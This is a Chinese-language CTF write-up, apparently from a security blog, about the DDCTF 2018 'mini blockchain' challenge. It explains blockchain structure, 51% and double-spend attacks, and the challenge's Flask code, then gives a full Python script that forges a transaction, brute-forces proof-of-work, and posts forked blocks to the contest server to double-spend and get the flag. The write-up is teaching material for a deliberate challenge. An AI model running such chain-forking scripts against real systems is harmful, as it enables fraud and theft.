> 原文链接: https://www.anquanke.com//post/id/105835 


# 由一道CTF题引发的区块链“股权纠纷案”


                                阅读量   
                                **166470**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



## 前言

最近结束的ddctf中mini blockchain一题与最近热门的区块链紧密挂钩，紧接着XCTF联赛的国际比赛starctf同样出现了一道与区块链相关的题目，于是我只能紧随潮流，来研究并且学习一波未知领域的知识。

> 首先放出参考链接，膜一波大佬们
[http://www.8btc.com/51attack ](http://www.8btc.com/51attack)
[http://www.lz1y.cn/archives/1372.html](http://www.lz1y.cn/archives/1372.html)
[http://hebic.me/2018/04/20/DDCTF2018-mini-blockchain-writeup/](http://hebic.me/2018/04/20/DDCTF2018-mini-blockchain-writeup/)

并且感谢研究区块链课题的同学kxz的ppt资料参考，当然，由于技术拙劣，难免出现错误，望各位更正。



## 区块链与比特币基础学习

### <a class="reference-link" name="%E8%B5%B7%E6%BA%90"></a>起源

区块链的概念首次在2008年末由中本聪（Satoshi Nakamoto）发表在比特币论坛中的论文《Bitcoin: A Peer-to-Peer Electronic Cash System》提出。<br>
论文中区块链技术是构建比特币数据结构与交易信息加密传输的基础技术，该技术实现了比特币的挖矿与交易。<br>
区块链是一种支持比特币运行的底层技术。<br>
2009年1月3日，中本聪在位于芬兰赫尔辛基的一个小型服务器上挖出了比特币的第一个区块——创世区块（Genesis Block），并获得了首批“挖矿”奖励——50个比特币。



### <a class="reference-link" name="%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"></a>基本概念

区块链是一种去中心化的分布式数据库<br>
Google上的定义是:<br>
区块链（Blockchain）是指通过去中心化和去信任的方式集体维护一个可靠数据库的技术方案。<br>
该技术方案让参与系统中的任意多个节点，把一段时间系统内全部信息交流的数据，通过密码学算法计算记录到一个数据块（block），并且生成该数据块的指纹用于链接（chain）下个数据块和校验，系统所有参与节点来共同认定记录是否为真。<br>
1.去中心化：<br>
即无中央管理机构，没有管理员。每个人都可以向区块中写数据，这就避免了一些大公司垄断的可能性。<br>
2.分布式：<br>
每个人都可以架设服务器成为区块链的一个节点<br>
3.数据库：<br>
区块链是存储数据的



### <a class="reference-link" name="%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E7%89%B9%E7%82%B9"></a>区块链的特点

1、去中心化<br>
由于使用分布式核算和存储，不存在中心化的硬件或管理机构，任意节点的权利和义务都是均等的，系统中的数据块由整个系统中具有维护功能的节点来共同维护。<br>
得益于区块链的去中心化特征，比特币也拥有去中心化的特征 。

2、开放性<br>
系统是开放的，除了交易各方的私有信息被加密外，区块链的数据对所有人公开，任何人都可以通过公开的接口查询区块链数据和开发相关应用，因此整个系统信息高度透明。

3、自治性<br>
区块链采用基于协商一致的规范和协议（比如一套公开透明的算法）使得整个系统中的所有节点能够在去信任的环境自由安全的交换数据，使得对“人”的信任改成了对机器的信任，任何人为的干预不起作用。

4、不可篡改<br>
一旦信息经过验证并添加至区块链，就会永久的存储起来，除非能够同时控制住系统中超过51%的节点，否则单个节点上对数据库的修改是无效的，因此区块链的数据稳定性和可靠性极高。

5、匿名性<br>
由于节点之间的交换遵循固定的算法，其数据交互是无需信任的（区块链中的程序规则会自行判断活动是否有效），因此交易对手无须通过公开身份的方式让对方自己产生信任，对信用的累积非常有帮助。



### <a class="reference-link" name="%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E7%BB%93%E6%9E%84"></a>区块链的结构

比特币是目前区块链技术最广泛的应用，可以通过比特币作为实例了解区块链的结构。<br>
但比特币并不是区块链，区块链是一种技术、平台。比特币只是区块链的一个应用。<br>
区块链是由许多区块组成的链，每个区块由区块头和数据组成。<br>
区块头里有32字节的父区块哈希值，父区块的哈希值由区块头各个字段的值连在一起经哈希函数（sha256）运算后得到的哈希值，这样区块便链接在一起。<br>
如果某一区块发生改变，那么之后的区块都必须改变，当区块足够多时，计算量是非常大的。在100个区块以后，区块链已经足够稳定。几千个区块（一个月）后的区块 链将变成确定的历史，永远不会改变。这也保证的区块链的安全性。<br>
比特币没有中心机构，几乎所有的完整节点都有一份公共总帐的备份，这份总帐可以被视为认证过的记录。区块链并不是由一个中心机构创造的，它 是由比特币网络中的所有节点各自独立竞争完成的。<br>
结构图：<br>[![](https://p1.ssl.qhimg.com/t01d22a23966cc18de0.png)](https://p1.ssl.qhimg.com/t01d22a23966cc18de0.png)<br>
区块头：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016673fdf3bcaf7138.png)



### <a class="reference-link" name="%E6%8C%96%E7%9F%BF%E4%B8%8E%E6%AF%94%E7%89%B9%E5%B8%81"></a>挖矿与比特币

想要生产下一个区块，必须计算出当前最新区块的区块头的哈希值。计算哈希值的过程便是挖矿。<br>
但计算出的哈希值要小于目标值,即target。<br>
target=targetmax/difficulty<br>
其中targetmax=0x00000000FFFF0000000000000000000000000000000000000000000000000000<br>
difficulty即区块头中的难度目标，difficulty动态变化，控制难度，使一个新区块的产生周期为10mins<br>
矿工通过遍历Nonce的值，来寻找合适的哈希值。所以也说挖矿掺杂运气成分。<br>
Nonce一共32位，所以最大计算次数可以到21.47亿。

每个区块中的第一个交易是特殊的: 它为第一个采到有效区块的人创建新的比特币。

开始时为2009年1月每个区块奖励50个比特币，然后到2012年11月减 半为每个区块奖励25个比特币。之后将在2016年的某个时刻再次减半为每个新区块奖励12.5个比特币。基于这个公 式，比特币挖矿奖励以指数方式递减，直到2140年。届时所有的比特币（20,999,999,980）全部发行完毕。换句话说 在2140年之后，不会再有新的比特币产生。<br>
每笔交易都可能包含一笔交易费，在2140年之后，所有的矿工收益都将由交易费构成。

挖矿主要方式是矿池挖矿，独立挖矿的风险过于庞大，几乎不可能。通过工作量证明(Nonce)分配收成。



### <a class="reference-link" name="%E5%8C%BA%E5%9D%97%E9%93%BE%E5%88%86%E5%8F%89%E9%97%AE%E9%A2%98"></a>区块链分叉问题

如果两个矿工同时算出哈希值，由于距离远近，不同的矿工看到这两个区块是有先后顺序的。通常情况下，矿工们会把自己先看到的区块复制过来，然后接着在这个区块开始新的挖矿工作。于是就出现了两个区块链：<br>[![](https://p5.ssl.qhimg.com/t017c1a5b861a917c81.jpg)](https://p5.ssl.qhimg.com/t017c1a5b861a917c81.jpg)<br>
但由于算力不同，最终会有一条区块链比较长，当矿工发现全网有一条更长的链时，他就会抛弃他当前的链，把新的更长的链全部复制回来，在这条链的基础上继续挖矿。所有矿工都这样操作，这条链就成为了主链，分叉出来被抛弃掉的链就消失了。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011e304c1f26f2b2dc.jpg)



## 区块链攻击

区块链存在多种攻击形式：

```
51%攻击
扣块攻击
双重花费攻击
自私采矿攻击
日蚀攻击
```

因为本次题目主要涉及

```
51%攻击
双重花费攻击
```

所以我仅在本篇文章中分析这2个攻击点<br>
(其实二者为一，相辅相成)<br>
所谓51%攻击即攻击者掌握了比特币全网的51%算力之后，用这些算力来重新计算已经确认过的区块，使块链产生分叉并且获得利益的行为。<br>
这里就涉及到之前区块链分叉的问题了<br>
还是以之前的图片为例<br>[![](https://p2.ssl.qhimg.com/t017c1a5b861a917c81.jpg)](https://p2.ssl.qhimg.com/t017c1a5b861a917c81.jpg)<br>
我们假设主链为<br>
1(黄)-2(黄)-3(黄)-4(蓝)-5(蓝)<br>
此时<br>
4(蓝)-5(蓝)<br>
为已计算确认过的区块<br>
而攻击者拥有51%的算力，没有任何用户可以超越他的计算速度<br>
于是他从区块3(黄)开始重新计算<br>
伪造生成区块

> 4(黄)-5(黄)-6(黄)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011e304c1f26f2b2dc.jpg)<br>
导致之前本已确认的

> 4(蓝)-5(蓝)

作废,使攻击达成<br>
这样的攻击获利方式也很简单。其实也就是双重花费攻击(后称双花攻击)<br>
我们结合DDCTF这道题目来了解一下



## 题目分析

个人认为分析flask代码首要还是查看路由

```
@app.route(url_prefix + '/')
def homepage():

@app.route(url_prefix + '/flag')
def getFlag():

@app.route(url_prefix + '/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')
def free_ddcoin(address):

@app.route(url_prefix + '/create_transaction', methods=['POST'])
def create_tx_and_check_shop_balance():

@app.route(url_prefix + '/reset')
def reset_blockchain():

@app.route(url_prefix + '/source_code')
def show_source_code():
```

路由大致如上<br>
我们从homepage入手，不难发现题目的背景

```
@app.route(url_prefix + '/')
def homepage():
    announcement = 'Announcement: The server has been restarted at 21:45 04/22. All blockchain have been reset. '
    balance, utxos, _ = get_balance_of_all()
    genesis_block_info = 'hash of genesis block: ' + session['genesis_block_hash']
    addr_info = 'the bank's addr: ' + bank_address + ', the hacker's addr: ' + hacker_address + ', the shop's addr: ' + shop_address
    balance_info = 'Balance of all addresses: ' + json.dumps(balance)
    utxo_info = 'All utxos: ' + json.dumps(utxos)
    blockchain_info = 'Blockchain Explorer: ' + json.dumps(session['blocks'])
    view_source_code_link = "&lt;a href='source_code'&gt;View source code&lt;/a&gt;"
    return announcement + ('&lt;br /&gt;&lt;br /&gt;rnrn'.join(
        [view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))

```

我们访问这个路由

```
http://116.85.48.107:5000/b942f830cf97e/
```

发现目前存在3个地址

```
the bank's addr: b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985

the hacker's addr: 955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131

the shop's addr: b81ff6d961082076f3801190a731958aec88053e8191258b0ad9399eeecd8306924d2d2a047b5ec1ed8332bf7a53e735

```

然后关注到每个账户的资金

```
Balance of all addresses: `{`"b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985": 1, "b81ff6d961082076f3801190a731958aec88053e8191258b0ad9399eeecd8306924d2d2a047b5ec1ed8332bf7a53e735": 0, "955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131": 999999`}`
```

即

```
hacker:999999
bank:1
shop:0
```

然后关注到输入与输出

```
All utxos: 
`{`
"07efd7c6-9331-4bc5-9284-3270c2e6b4c1": 
`{`
"amount": 1, "hash": "79da1a4388dc5c8a108ed8e46a03be5afe9c9354d663197898fb9a1c9706ffb8", 
"addr": "b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985", 
"id": "07efd7c6-9331-4bc5-9284-3270c2e6b4c1"`}`,

"f7e645d3-80dc-4211-a144-16bb65e0ce9d":
`{`
"amount": 999999, 
"hash": "e1177f4ad17602c1e97778eafb0be9f713788d0eb6c0a1f6a094058ac3b8f40d", 
"addr": "955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131",
"id": "f7e645d3-80dc-4211-a144-16bb65e0ce9d"
`}`
 `}`
```

以及区块情况

```
`{`
"d4b81acf2228fc10744a9a26c01d38a5ad93fc1050493027d9c34ceb0b2e8ab5": 
`{`
"nonce": "a empty block",
"prev": "60f34caf7d0c257208bcd20bef32b7d3a9e3fff69fd9e66f9c634b39cce4c65d",
"hash": "d4b81acf2228fc10744a9a26c01d38a5ad93fc1050493027d9c34ceb0b2e8ab5",
"transactions": [],
"height": 2
`}`,

"10aced778e1efe7495bdf78756b5563b355bd9d0f620670b3718a96f511249c7": 
`{`
"nonce": "The Times 03/Jan/2009 Chancellor on brink of second bailout for bank",
"prev": "0000000000000000000000000000000000000000000000000000000000000000",
"hash": "10aced778e1efe7495bdf78756b5563b355bd9d0f620670b3718a96f511249c7",
"transactions": [`{`"input": [],
"signature": [],
"hash": "3babd7fb07e2ad96f824eb2ed39adced4560fadeef92f194f8d51711285f4dab",
"output": [`{`"amount": 1000000,
"hash": "65019b18f48817c9bf7897bf616c0e72eb88370d60c0a2647fc8fb30b9b4dcfb",
"addr": "b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985",
"id": "be4f2b71-f371-446b-be0d-b268352e8adf"`}`]`}`],
"height": 0`}`,

"60f34caf7d0c257208bcd20bef32b7d3a9e3fff69fd9e66f9c634b39cce4c65d": 
`{`
"nonce": "HAHA, I AM THE BANK NOW!",
"prev": "10aced778e1efe7495bdf78756b5563b355bd9d0f620670b3718a96f511249c7",
"hash": "60f34caf7d0c257208bcd20bef32b7d3a9e3fff69fd9e66f9c634b39cce4c65d",
"transactions": [`{`"input": ["be4f2b71-f371-446b-be0d-b268352e8adf"],
"signature": ["585f3e49f71d97c5a014fd0947e9049fea260796ef65aa6d5ec46bb5bc1ccfb410741da1c1bff8e970ac3149fea6817c"],
"hash": "75da7f7eb267f1203fcc3e34347b2d109160a9836e140d3f500be8d6904bdfd5",
"output": [`{`"amount": 999999,
"hash": "e1177f4ad17602c1e97778eafb0be9f713788d0eb6c0a1f6a094058ac3b8f40d",
"addr": "955c823ea45e97e128bd2c64d139b3625afb3b19c37da9972548f3d28ed584b24f5ea49a17ecbe60e9a0a717b834b131",
"id": "f7e645d3-80dc-4211-a144-16bb65e0ce9d"`}`,
`{`"amount": 1,
"hash": "79da1a4388dc5c8a108ed8e46a03be5afe9c9354d663197898fb9a1c9706ffb8",
"addr": "b2b69bf382659fd193d40f3905eda4cb91a2af16d719b6f9b74b3a20ad7a19e4de41e5b7e78c8efd60a32f9701a13985",
"id": "07efd7c6-9331-4bc5-9284-3270c2e6b4c1"`}`]`}`],
"height": 1`}`
`}`
```

我们可以知道<br>
第一个区块：创世区块<br>
向银行地址发放DDB为1000000<br>
第二个区块：黑客添加区块<br>
让银行账户向黑客账户转账999999 DDB<br>
第三个区块：空区块<br>
然后我们查看getflag的方式

```
@app.route(url_prefix + '/flag')
def getFlag():
    init()
    if session['your_diamonds'] &gt;= 2: return FLAG()
    return 'To get the flag, you should buy 2 diamonds from the shop. You have `{``}` diamonds now. To buy a diamond, transfer 1000000 DDCoins to '.format(
        session['your_diamonds']) + shop_address
```

题目要求我们的钻石数大于等于2,即可返回flag<br>
我们去查看如何获得钻石,定位到

```
@app.route(url_prefix + '/create_transaction', methods=['POST'])
def create_tx_and_check_shop_balance():
    init()
    try:
        block = json.loads(request.data)
        append_block(block, DIFFICULTY)
        msg = 'transaction finished.'
    except Exception, e:
        return str(e)

    balance, utxos, tail = get_balance_of_all()
    if balance[shop_address] == 1000000:
        # when 1000000 DDCoins are received, the shop will give you a diamond
        session['your_diamonds'] += 1
        # and immediately the shop will store the money somewhere safe.
        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)
        new_block = create_block(tail['hash'], 'save the DDCoins in a cold wallet', [transferred])
        append_block(new_block)
        msg += ' You receive a diamond.'
    return msg
```

发现即shop的账户中拥有1000000即可获得钻石一枚<br>
但是我们该系统中一共只有100万的DDB，如何去购买2颗钻石呢？<br>
这里就涉及到了双花攻击(51%攻击)<br>
顾名思义，双花攻击，花费100万，购买200万的物品，甚至更多的物品。<br>
首先明确一点，这时没有人和我们比拼算力<br>
即我们拥有100%的算力,所以我们可以轻松添加区块，改变主链走向<br>
那么这和双花攻击有什么关系呢？<br>
我们从下面的图片进行分析<br>[![](https://p3.ssl.qhimg.com/t011e8f59c542b470f0.png)](https://p3.ssl.qhimg.com/t011e8f59c542b470f0.png)<br>
蓝色为目前题目的3个区块<br>
区块操作之前已经描述

> 第一个区块：创世区块 向银行地址发放DDB为1000000 第二个区块：黑客添加区块 让银行账户向黑客账户转账999999 DDB 第三个区块：空区块

而由于我们拥有100%算力，我们可以使用攻击，重新计算已经确认过的区块，改变区块走向<br>
故此我们来到3个红色区块的地方

> 黑客区块2：向shop转账100万 黑客区块3：空区块 黑客区块4：空区块

此时由于我们算力最强，没有人可以计算的过我们，我们成功改变主链走向<br>
此时主链变为<br>[![](https://p5.ssl.qhimg.com/t0164b11780dd064b81.png)](https://p5.ssl.qhimg.com/t0164b11780dd064b81.png)<br>
而由于现在主链变为红色部分，之前黑客的操作全部作废<br>
所以此时我们的操作成立，即shop获得100万，我们获得钻石一枚<br>
此时我们可以触发双花攻击<br>
即我们让shop把这100万转出去，然后改变主链走向，让这一操作不成立，则100万又会返回到shop，此时我们的钻石又会继续+1<br>
如图<br>[![](https://p3.ssl.qhimg.com/t0102f4e35bb7cccbde.png)](https://p3.ssl.qhimg.com/t0102f4e35bb7cccbde.png)<br>
我们现在的主链为红色部分，我们在黑客区块5，让shop给shop_wallet_addressz转账100万<br>
然后我们利用最强算力<br>
重新计算黑客区块5(已确认过的区块)<br>
生成空区块(绿色部分)

> 黑客区块6 黑客区块7

由于我们后续创建的分叉支路(绿色)更长<br>
所以成为主链<br>[![](https://p0.ssl.qhimg.com/t01451ee53434fd3a7d.png)](https://p0.ssl.qhimg.com/t01451ee53434fd3a7d.png)<br>
之前的shop转账操作作废，100万回到shop手中<br>
此时我们的钻石即可再次+1<br>
故此可以完成此题



## payload构造

首先我们关注到hacker区块的写法，即原始第二个区块<br>
为了模仿黑客创建区块的转账写法，我们去跟一跟源码，以便创造我们自己的伪区块，给shop转账<br>
从路由

```
@app.route(url_prefix + '/')
```

中我们可以看到

```
def homepage():
    announcement = 'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '
    balance, utxos, _ = get_balance_of_all()
```

我们跟进`get_balance_of_all()`

```
def get_balance_of_all():
    init()
    tail = find_blockchain_tail()
    utxos = calculate_utxo(tail)
    return calculate_balance(utxos), utxos, tail
```

我们跟进init()

```
second_block = create_block(genesis_block['hash'], 'HAHA, I AM THE BANK NOW!', [transferred])
append_block(second_block)
```

我们继续跟进create_block()

```
def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) &gt; 128: raise Exception('the nonce is too long')
    block = `{`'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions`}`
    block['hash'] = hash_block(block)
    return block
```

可以得到区块生成需要的元素

```
block = `{`'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions`}`
```

其中<br>
prev为前一个区块的hash<br>
nonce需要我们自行爆破遍历<br>
transactions(交易)需要我们自己计算<br>
然后我们跟进append_block()<br>
不难发现关键语句

```
block = create_block(block['prev'], block['nonce'], block['transactions'])
block_hash = int(block['hash'], 16)
if block_hash &gt; difficulty: raise Exception('Please provide a valid Proof-of-Work')
block['height'] = tail['height'] + 1
```

其中要求

```
if block_hash &gt; difficulty: raise Exception('Please provide a valid Proof-of-Work')
```

故此我们可以写出爆破函数

```
def pow(b, difficulty, msg=""):
    nonce = 0
    while nonce&lt;(2**32):
        b['nonce'] = msg+str(nonce)
        b['hash'] = hash_block(b)
        block_hash = int(b['hash'], 16)
        if block_hash &lt; difficulty:
            return b
        nonce+=1
```

而关于transactions的计算在create_block()中同样有体现，我就不赘述了，可以浓缩为

```
tx = `{`"input":[input],"output":[`{`"amount":1000000, 'id':txout_id,'addr':shop_address`}`],'signature':[signature]`}`
tx["output"][0]["hash"] = hash_utxo(tx["output"][0])
tx['hash'] = hash_tx(tx)
block1["transactions"] = [tx]
```

至此三元素基本解决<br>
值得一提的是，空区块无需计算transactions，所以基本就是爆破遍历Nonce了<br>
最后可以写出一键化运行脚本



## payload

安装好库依赖，一键化脚本，直接运行即可获得flag

```
# # -*- encoding: utf-8 -*-
import rsa, uuid, json, copy,requests,re,hashlib
# 获取初始session
url = "http://116.85.48.107:5000/b942f830cf97e/"
r = requests.get(url=url)
session = r.headers['Set-Cookie'].split(";")[0][8:]
Cookie = `{`
    "session":session
`}`
r = requests.get(url=url,cookies=Cookie)
# 获取需要的信息
genesis_hash_re = r'hash of genesis block: (.*?)&lt;br /&gt;&lt;br /&gt;'
genesis_hash = re.findall(genesis_hash_re, r.content)[0]

shop_address_re = r", the shop's addr: (.*?)&lt;br /&gt;&lt;br /&gt;"
shop_address = re.findall(shop_address_re, r.content)[0]

input_re = r'''[`{`"input": ["(.*?)"],'''
input = re.findall(input_re, r.content)[0]

signature_re = r'''"], "signature": ["(.*?)"]'''
signature = re.findall(signature_re, r.content)[0]

txout_id = str(uuid.uuid4())
#工作量证明
def pow(b, difficulty, msg=""):
    nonce = 0
    while nonce&lt;(2**32):
        b['nonce'] = msg+str(nonce)
        b['hash'] = hash_block(b)
        block_hash = int(b['hash'], 16)
        if block_hash &lt; difficulty:
            return b
        nonce+=1
def myprint(b):
    return json.dumps(b)

DIFFICULTY = int('00000' + 'f' * 59, 16)

def hash(x):
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x) + hash(y))

EMPTY_HASH = '0' * 64

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'],
                                 reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def empty_block(msg, prevHash):
    b=`{``}`
    b["prev"] = prevHash
    b["transactions"] = []
    b = pow(b, DIFFICULTY, msg)
    return b

#从创世块开始分叉，给商店转1000000
block1 = `{``}`
block1["prev"] = genesis_hash
tx = `{`"input":[input],"output":[`{`"amount":1000000, 'id':txout_id,'addr':shop_address`}`],'signature':[signature]`}`
tx["output"][0]["hash"] = hash_utxo(tx["output"][0])
tx['hash'] = hash_tx(tx)
block1["transactions"] = [tx]
block1 = pow(block1, DIFFICULTY)
url_begin = "http://116.85.48.107:5000/b942f830cf97e/create_transaction"
def header_change(session):
    header = `{`
    "Host":"116.85.48.107:5000",
    "Upgrade-Insecure-Requests":"1",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language":"zh-CN,zh;q=0.8",
    "Cookie":"session="+session,
    "Connection":"close",
    "Content-Type":"application/json"
    `}`
    return header
s1 = requests.post(url=url_begin,data=myprint(block1),headers=header_change(session))
session1 = s1.headers['Set-Cookie'].split(";")[0][8:]
print s1.content
#构造空块增加分叉链长度，使分叉链最长，因为max的结果不唯一，少则一次多则两次
block2 = empty_block("myempty1", block1["hash"])
s2 = requests.post(url=url_begin,data=myprint(block2),headers=header_change(session1))
session2 = s2.headers['Set-Cookie'].split(";")[0][8:]
print s2.content
block3 = empty_block("myempty2", block2["hash"])
s3 = requests.post(url=url_begin,data=myprint(block3),headers=header_change(session2))
session3 = s3.headers['Set-Cookie'].split(";")[0][8:]
print s3.content
#余额更新成功,系统自动添加块，转走商店钱，钻石+１
#从自己的块，即系统转走钱之前的那个块再次分叉，添加空块
block4 = empty_block("myempty3", block3["hash"])
s4 = requests.post(url=url_begin,data=myprint(block4),headers=header_change(session3))
session4 = s4.headers['Set-Cookie'].split(";")[0][8:]
print s4.content
block5 = empty_block("myempty4", block4["hash"])
s5 = requests.post(url=url_begin,data=myprint(block5),headers=header_change(session4))
session5 = s5.headers['Set-Cookie'].split(";")[0][8:]
print s5.content

flag_url = "http://116.85.48.107:5000/b942f830cf97e/flag"
flag = requests.get(url=flag_url,headers=header_change(session5))
print flag.content
#新的分叉链最长，余额更新成功，钻石+１
```

运行结果

```
transaction finished.
transaction finished. You receive a diamond.
transaction finished. You receive a diamond.
transaction finished. You receive a diamond.
transaction finished.
Here is your flag: DDCTF`{`B1OcKch@iN_15_FuN_d03f8306a6e`}`
```

最后得到flag

```
DDCTF`{`B1OcKch@iN_15_FuN_d03f8306a6e`}`
```



## 后记

区块链博大精深，初涉皮毛，希望以后可以深入学习，顺应时代潮流~
